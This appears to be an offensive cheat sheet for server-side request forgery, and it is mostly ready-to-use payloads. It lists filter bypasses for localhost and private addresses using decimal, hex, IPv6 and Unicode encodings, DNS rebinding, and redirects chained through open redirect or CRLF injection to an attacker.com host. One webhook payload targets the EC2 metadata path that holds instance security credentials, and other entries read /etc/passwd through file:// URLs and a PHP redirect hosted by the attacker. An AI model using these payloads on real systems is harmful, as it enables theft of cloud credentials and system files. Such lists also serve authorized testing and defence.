# Server Side Request Forgery (SSRF)

**SSRF Chains**

* Chaining openredirect with SSRF to bypass domain based restrictions
  * `example.com/ssrf.php?url=/redir.php?url=//attacker.com`
* Chaining CRLF with SSRF
  * &#x20;`example.com/ssrf.php?url=/test%0d%0aHost:%20attacker.com`

**Bypass restrictions for localhost**

* http://127.0.0.1
* http://127.1:80
* http://0
* http://0.0.0.0:80
* http://localhost:80
* http://\[::]:80/
* http://\[::]25/ SMTP
* http://\[::]:3128 Squid
* http://\[0000::1]:80/
* http://\[0:0:0:0:0:ffff:127.0.0.1]/file
* http://①②⑦.⓿.⓿.⓿

**CDIR Bypass**

* http://127.127.127.127
* http://127.0.1.3
* http://127.0.0.0

**Decimal bypass**

* http://2130706433/ = http://127.0.0.1
* http://017700000001 = http://127.0.0.1
* http://3232235521/ = http://192.168.0.1
* http://3232235777/ = http://192.168.1.1

**Hexadecimal bypass**

* 127.0.0.1 = 0x07f 00 00 01
* http://0x7f000001/ = http://127.0.0.1
* http://0xc0a80014/ = http://192.168.0.20

**Bypassing using DNS**&#x20;

* DNS Rebinding
  * `make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms`
* Domain redirection
  * `localtest.me points to 127.0.0.1`

Bypass using enclosed alphanumerics

* `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ`

Bypass using 301 redirect&#x20;

* `http://allowedhost.com/ -> 301 -> http://127.0.0.1`

**SSRF in Webhook**

* If we have the following scenario:
  * Input URL:
    * http://google.com
  * Server request to:
    * http://google.com/webhook
    *
* To remove **/webhook**, we can add **? # %00**
  * `url=http://make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms/2021-03-23/meta-data/identity-credentials/ec2/security-credentials/ec2-instance?`

**SSRF accessing internal file**

* Application takes link and returns screenshot of link
  * Input
    * `file:///etc/passwd`

**SSRF via XSS in PDF renderers**

* Check for PDF Export feature
  * Create a test.php on attacker server
  * `<?php` \
    &#x20;       `header('Location: file:///etc/passwd');` \
    `?>`

Tools

* [https://github.com/KathanP19/gaussrf/blob/master/ssrf.sh](https://github.com/KathanP19/gaussrf/blob/master/ssrf.sh)
  * `ssrf.sh example.cpm collaborator.net`
*
